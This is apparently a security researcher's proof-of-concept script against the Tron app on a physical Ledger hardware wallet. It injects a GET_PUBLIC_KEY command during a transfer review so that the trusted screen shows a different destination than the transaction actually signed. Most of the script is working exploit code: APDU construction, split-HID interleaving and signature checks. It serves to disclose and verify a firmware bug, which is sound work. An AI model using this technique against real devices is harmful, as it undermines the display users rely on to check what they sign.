#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Manual, on-hardware proof of concept for the UI-buffer-clobbering TOCTOU.

Companion to tests/test_toctou.py::test_toctou_ui_buffer_clobbering (which runs
on Speculos). This variant proves the same flaw on a *physical* Ledger over the
split-HID channel from toctouInterleave.py.

The flaw
--------
``handleGetPublicKey()`` copies its base58 result into the SHARED ``toAddress``
buffer (src/handlers/get_public_key.c: ``memcpy(toAddress, ...)``). The transfer
review displays its destination from that very buffer
(src/ui/ui_review_menu_bagl.c: ``ux_approval_tx_4_step -> .text = toAddress``).

So while a transfer review for account A is on screen, a *non-confirming*
GET_PUBLIC_KEY for account B rewrites ``toAddress`` and the destination shown to
the user changes to account B's address -- yet the transaction that eventually
gets signed is still the ORIGINAL one (its parsed contents in ``txContent`` were
never touched). What you see is no longer what you sign.

What you can observe on hardware
--------------------------------
The primary, device-visible evidence is the destination address on the trusted
screen changing from the real one to account B's address. The injected
GET_PUBLIC_KEY answers synchronously (0x9000 + data), which -- exactly as in the
keysub scenario -- consumes the HID transport's single reply slot, so the
post-approval signature is frequently dropped and not returned to the host. That
does NOT weaken the finding: the injection only writes the display buffer
``toAddress``; it never touches ``txContent``, so whatever the device signs is
provably the original transaction. If a signature *does* come back, the script
recovers it and confirms it covers the original tx signed by account A.

Requirements / transport
------------------------
USB HID only (what ``getDongle(True)`` returns for a physical device), same as
toctouInterleave.py. Tron app open and unlocked. No special settings needed
(unlike keysub, this does not require "Sign by hash").

Usage
-----
  python3 toctouUiClobber.py
  python3 toctouUiClobber.py --path-a "44'/195'/0'/0/0" --path-b "44'/195'/1'/0/0"
  python3 toctouUiClobber.py --raw <transfer-raw-hex> --debug
"""
import argparse
import hashlib
import sys
import threading

from ledgerblue.comm import getDongle

from base import apduMessage, parse_bip32_path
# Reuse the split-HID channel and helpers from the interleave PoC.
from toctouInterleave import (HidInterleaveChannel, get_public_key_apdu,
                              parse_get_public_key, recover_signer,
                              query_reference_key, flush_after_approval,
                              wait_for_approval_reply, prompt, show_replies,
                              SW_OK, APPROVAL_REPLY_TIMEOUT, INS_SIGN, P1_SIGN)

# A known-good single-APDU Tron TransferContract (from signTransaction.py). Its
# to_address is extracted below so we know what SHOULD be displayed.
DEFAULT_RAW = (
    "0a027d52220889fd90c45b71f24740e0bcb0f2be2c5a67080112630a2d747970"
    "652e676f6f676c65617069732e636f6d2f70726f746f636f6c2e5472616e7366"
    "6572436f6e747261637412320a1541c8599111f29c1e1e061265b4af93ea1f27"
    "4ad78a1215414f560eb4182ca53757f905609e226e96e8e1a80c18c0843d70d0"
    "f5acf2be2c")

_B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


###############################################################################
# Address helpers
###############################################################################
def base58check(payload):
    """Tron base58check: base58(payload || sha256(sha256(payload))[:4])."""
    checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    data = payload + checksum
    num = int.from_bytes(data, "big")
    out = ""
    while num > 0:
        num, rem = divmod(num, 58)
        out = _B58[rem] + out
    # Preserve leading-zero bytes as leading '1's.
    for byte in data:
        if byte == 0:
            out = _B58[0] + out
        else:
            break
    return out


def extract_to_address(raw_bytes):
    """Pull the 21-byte (0x41-prefixed) to_address out of a TransferContract.

    Owner is encoded as field 1 (``0a 15 41 ..``), destination as field 2
    (``12 15 41 ..``). We scan for the ``12 15 41`` marker.
    """
    marker = bytes.fromhex("121541")
    idx = raw_bytes.find(marker)
    if idx < 0:
        return None
    start = idx + 2  # keep the 0x41 prefix
    return raw_bytes[start:start + 21]


###############################################################################
# APDU builder
###############################################################################
def sign_transfer_apdu(path, raw_hex):
    """Full single-APDU transfer sign (INS=SIGN, P1=SIGN/last)."""
    return apduMessage(INS_SIGN, P1_SIGN, 0x00, parse_bip32_path(path), raw_hex)


###############################################################################
# Scenario
###############################################################################
def run_uiclobber(channel, dongle, path_a, path_b, raw_hex):
    print("== Scenario: UI-buffer clobbering (displayed destination swap) ==")
    raw_bytes = bytes.fromhex(raw_hex)
    to_bytes = extract_to_address(raw_bytes)
    real_dest = base58check(to_bytes) if to_bytes else "(could not decode)"

    ref_pk_a, addr_a = query_reference_key(dongle, path_a)
    ref_pk_b, addr_b = query_reference_key(dongle, path_b)
    tx_digest = hashlib.sha256(raw_bytes).digest()

    print("  signing account A ({}): {}".format(path_a, addr_a))
    print("  injected account B ({}): {}".format(path_b, addr_b))
    print("  REAL transaction destination : {}".format(real_dest))
    print("  tx digest (sha256 of raw)    : {}".format(tx_digest.hex()))

    print("\nSending transfer SIGN for account A...")
    channel.send(sign_transfer_apdu(path_a, raw_hex))
    prompt("Check the device: a TRANSFER review for account A should be on "
           "screen.\n    Page to the destination and confirm it shows:\n"
           "        {}\n    Then page BACK toward the start (leave the "
           "destination page).\n    Do NOT approve yet.".format(real_dest))

    print("Injecting GET_PUBLIC_KEY (non-confirm) for account B...")
    channel.send(get_public_key_apdu(path_b, confirm=False))
    pre = channel.drain(quiet=3.0)
    show_replies("injection reply", pre)
    injected_addrs = []
    for data, status in pre:
        if status == SW_OK:
            try:
                injected_addrs.append(parse_get_public_key(data)[1])
            except Exception:
                pass
    if addr_b in injected_addrs:
        print("  injection acknowledged; toAddress now holds account B's "
              "address.")
    else:
        print("  (no account-B address in the injection reply; the device may "
              "have refused it -- possibly already fixed.)")

    prompt("Now page THROUGH the review to the destination step again.\n"
           "    It should now display account B:\n        {}\n"
           "    i.e. NOT the real destination {}.\n"
           "    Note what you see, then APPROVE the transfer.".format(
               addr_b, real_dest))

    approval_state = {"replies": [], "error": None}
    approval_thread = threading.Thread(target=wait_for_approval_reply,
                                       args=(channel, approval_state),
                                       daemon=True)
    approval_thread.start()
    approval_thread.join(timeout=APPROVAL_REPLY_TIMEOUT + 5.0)
    if approval_state["error"] is not None:
        raise approval_state["error"]
    post = approval_state["replies"]
    if not post:
        post = flush_after_approval(channel)
    show_replies("post-approval reply", post)

    print("\n--- Result ---")
    print("Displayed destination after injection : {}".format(addr_b))
    print("Real (parsed & signed) destination    : {}".format(real_dest))
    if addr_b != real_dest and to_bytes is not None:
        print("*** DISPLAY CLOBBERED: the trusted screen showed a destination "
              "the\n    transaction does not pay. (Confirm visually above.) ***")

    # A transfer signature is exactly 65 bytes (r||s||v) and can only arrive
    # AFTER approval. Never scan `pre`: it holds the injection's GET_PUBLIC_KEY
    # reply (pubkey + address, ~101 bytes), which must not be mistaken for a
    # signature.
    signatures = [data for data, sw in post
                  if sw == SW_OK and 65 <= len(data) <= 72]
    if not signatures:
        print("\nNo signature returned (the synchronous injection reply "
              "consumed the\nHID transport slot, as in keysub). The display "
              "corruption above still\nstands: the injection only wrote the "
              "toAddress display buffer, never\ntxContent, so any signature the "
              "device produced covers the ORIGINAL tx.")
        return

    signer = recover_signer(tx_digest, signatures[0])
    signer_pk = signer.to_bytes().hex()
    print("\nExpected signer (account A) : {}".format(ref_pk_a.hex()[2:]))
    print("Actual signer of the tx     : {}".format(signer_pk))
    if signer_pk == ref_pk_a.hex()[2:]:
        print("\n*** VULNERABLE: the signature covers the ORIGINAL transfer to "
              "{}\n    (account A), while the device DISPLAYED {} during "
              "review.\n    Displayed != signed. ***".format(real_dest, addr_b))
    else:
        print("\nInconclusive: unexpected signer (the signed tx is not account "
              "A's original transfer).")


def main():
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--path-a", default="44'/195'/0'/0/0",
                        help="signing account shown for review")
    parser.add_argument("--path-b", default="44'/195'/1'/0/0",
                        help="account whose address is injected into the "
                             "display")
    parser.add_argument("--raw", default=DEFAULT_RAW,
                        help="transfer raw-data hex to sign (default: a sample "
                             "TransferContract)")
    parser.add_argument("--debug", action="store_true",
                        help="log every raw HID frame sent and received")
    args = parser.parse_args()

    print("-= Tron Ledger =- TOCTOU UI-clobber PoC (HARDWARE, interactive)")
    print("Make sure the Tron app is open and the device is unlocked.\n")

    dongle = getDongle(args.debug)
    try:
        channel = HidInterleaveChannel(dongle, debug=args.debug)
        run_uiclobber(channel, dongle, args.path_a, args.path_b, args.raw)
    finally:
        dongle.close()


if __name__ == "__main__":
    sys.exit(main())
